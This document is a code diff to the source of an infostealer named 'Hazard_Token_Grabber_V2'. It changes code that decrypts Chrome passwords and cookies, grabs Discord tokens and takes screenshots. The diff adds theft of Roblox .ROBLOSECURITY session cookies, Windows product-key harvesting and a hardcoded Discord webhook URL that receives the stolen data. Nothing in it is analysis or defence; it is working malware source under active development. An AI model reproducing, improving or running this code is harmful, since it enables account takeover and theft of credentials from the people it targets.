@@ -1,4 +1,5 @@
 import os
+from numpy import append
 import requests
 import shutil
 import sqlite3
@@ -16,8 +17,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "WEBHOOK_HERE" #replace WEBHOOK_HERE with your webhook
-        self.files = ""
+        self.webhook = "https://discord.com/api/webhooks/952913467411689512/WbohpTWQ0u9em9CYBZFE23SwRlMfFohI3Ec3Vj5MOcFUGrs2HqywgisTz1TZF5dx4Bca" #replace WEBHOOK_HERE with your webhook
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
@@ -32,20 +32,23 @@ class Hazard_Token_Grabber_V2:
             pass
 
         self.tokens = []
+        self.robloxcookies = []
+        self.files = ""
         self.discord_psw = []
         self.backup_codes = []
         
-        self.bypassBetterDiscord()
-        self.bypassTokenProtector()
+        # self.bypassBetterDiscord()
+        # self.bypassTokenProtector()
         if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
             self.files += f"{os.getlogin()} doesn't have google installed\n"
         else:
             self.grabPassword()
             self.grabCookies()
         Thread(target=self.screenshot).start()
-        Thread(target=self.killDiscord).start()
+        # Thread(target=self.killDiscord).start()
         self.grabTokens()
         self.neatifyTokens()
+        self.grabRobloxCookie()
         for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
                 with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
@@ -62,7 +65,7 @@ class Hazard_Token_Grabber_V2:
                             print("ok")
 
         self.SendInfo()
-        self.Injection()
+        # self.Injection()
         shutil.rmtree(self.tempfolder)
         
     def getheaders(self, token=None, content_type="application/json"):
@@ -149,13 +152,15 @@ class Hazard_Token_Grabber_V2:
                         l = Replacement
                 f.writelines(l)
 
-    def getProductKey(self):
-        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", creationflags=0x08000000, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
-        process2 = subprocess.Popen("wmic os get Caption", creationflags=0x08000000, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
-        productName = process2.communicate()[0].decode().strip("Caption\n").strip()
-        if not wkey:
-            return [productName, "No Key Extracted"]
+    def getProductValues(self):
+        try:
+            wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
+        except:
+            wkey = "N/A (Likely Pirated)"
+        try:
+            productName = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
+        except:
+            productName = "N/A"
         return [productName, wkey]
 
     def get_master_key(self, path):
@@ -168,18 +173,12 @@ class Hazard_Token_Grabber_V2:
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
-    def decrypt_payload(self, cipher, payload):
-        return cipher.decrypt(payload)
-    
-    def generate_cipher(self, aes_key, iv):
-        return AES.new(aes_key, AES.MODE_GCM, iv)
-    
     def decrypt_password(self, buff, master_key):
         try:
             iv = buff[3:15]
             payload = buff[15:]
-            cipher = self.generate_cipher(master_key, iv)
-            decrypted_pass = self.decrypt_payload(cipher, payload)
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception:
@@ -230,10 +229,9 @@ class Hazard_Token_Grabber_V2:
                 for r in cursor.fetchall():
                     host = r[0]
                     user = r[1]
-                    encrypted_cookie = r[2]
-                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                    if host != "":
-                        f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    decrypted_cookie = self.decrypt_password(r[2], master_key)
+                    if host != "": f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+                    if '.ROBLOSECURITY' in user: self.robloxcookies.append(decrypted_cookie)
             except Exception:
                 pass
         cursor.close()
@@ -242,6 +240,15 @@ class Hazard_Token_Grabber_V2:
             os.remove("Loginvault.db")
         except Exception:
             pass
+
+    def grabRobloxCookie(self):
+        try:
+            self.robloxcookies.append(subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000).decode().rstrip())
+        except Exception:
+            pass
+        if self.robloxcookies:
+            with open(self.tempfolder+"\\Roblox Cookie.txt", "w") as f:
+                for i in self.robloxcookies: f.write(i+'\n')
 
     def grabTokens(self):
         paths = {
@@ -375,8 +382,8 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
-        wname = self.getProductKey()[0]
-        wkey = self.getProductKey()[1]
+        wname = self.getProductValues()[0]
+        wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("https://ipinfo.io/json").json()
